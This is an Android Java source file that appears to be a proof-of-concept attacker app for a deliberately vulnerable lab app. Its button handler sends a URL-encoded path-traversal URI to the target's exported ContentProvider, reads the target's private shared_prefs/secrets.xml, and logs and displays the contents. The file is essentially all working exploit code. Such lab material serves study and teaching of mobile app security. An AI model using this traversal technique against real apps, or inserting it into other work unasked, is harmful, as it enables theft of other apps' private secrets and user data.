package com.example.vulnapps.exported_providers_poc;

import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class MainActivity extends AppCompatActivity {

    static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button read_secret = findViewById(R.id.read_secret);

        read_secret.setOnClickListener(view -> {
            Uri uri = Uri.parse("content://com.example.vulnapps.exported_providers.ShareContentProvider/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.example.vulnapps.exported_providers%2Fshared_prefs%2Fsecrets.xml");
            Log.d(TAG, "onCreate: " + uri);
            try {
                ContentResolver contentResolver = this.getContentResolver();
                FileInputStream inputStream = (FileInputStream)contentResolver.openInputStream(uri);
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
                String lineBuffer;
                String text = "";
                while (true){
                    lineBuffer = reader.readLine();
                    if (lineBuffer != null){
                        text += lineBuffer;
                    }
                    else {
                        break;
                    }
                }
                Log.d(TAG, "onCreate: " + text);
                Toast.makeText(this, text, Toast.LENGTH_SHORT).show();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
    }
}